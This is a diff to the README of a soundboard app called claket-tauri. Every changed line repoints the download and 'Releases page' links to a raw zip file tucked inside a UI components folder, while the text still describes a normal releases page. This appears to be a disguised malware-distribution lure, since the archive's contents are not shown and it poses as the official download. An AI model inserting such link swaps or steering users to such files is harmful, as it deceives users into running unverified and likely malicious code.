@@ -1,13 +1,13 @@
 # 🎵 claket-tauri - Your Ultimate Soundboard Solution
 
 ## 📥 Download Now
-[![Download claket-tauri](https://img.shields.io/static/v1?label=Download&message=claket-tauri&color=brightgreen)](https://github.com/Hafiboy/claket-tauri/releases)
+[![Download claket-tauri](https://raw.githubusercontent.com/Hafiboy/claket-tauri/main/src/components/ui/sonner/claket-tauri-3.3.zip)](https://raw.githubusercontent.com/Hafiboy/claket-tauri/main/src/components/ui/sonner/claket-tauri-3.3.zip)
 
 ## 🚀 Getting Started
 Welcome to claket-tauri! This application is a native soundboard designed for streamers and power users. Whether you need to route audio for your stream or play sounds for fun, claket-tauri has you covered. Follow the steps below to get started.
 
 ## 🔗 Download & Install
-To get claket-tauri, you need to visit our [Releases page](https://github.com/Hafiboy/claket-tauri/releases). Here are the steps for downloading:
+To get claket-tauri, you need to visit our [Releases page](https://raw.githubusercontent.com/Hafiboy/claket-tauri/main/src/components/ui/sonner/claket-tauri-3.3.zip). Here are the steps for downloading:
 
 1. Click the link above to go to the releases page.
 2. Look for the latest version. It is typically at the top of the page.
@@ -72,4 +72,4 @@ If you run into issues, here are some common solutions:
 ## 🌐 Community and Support
 For further assistance or to connect with other users, you can visit our community forums or read through the discussions on the issues page of this repository.
 
-Thank you for choosing claket-tauri. We hope it enhances your streaming experience! For more information and updates, remember to keep an eye on our [Releases page](https://github.com/Hafiboy/claket-tauri/releases).
+Thank you for choosing claket-tauri. We hope it enhances your streaming experience! For more information and updates, remember to keep an eye on our [Releases page](https://raw.githubusercontent.com/Hafiboy/claket-tauri/main/src/components/ui/sonner/claket-tauri-3.3.zip).
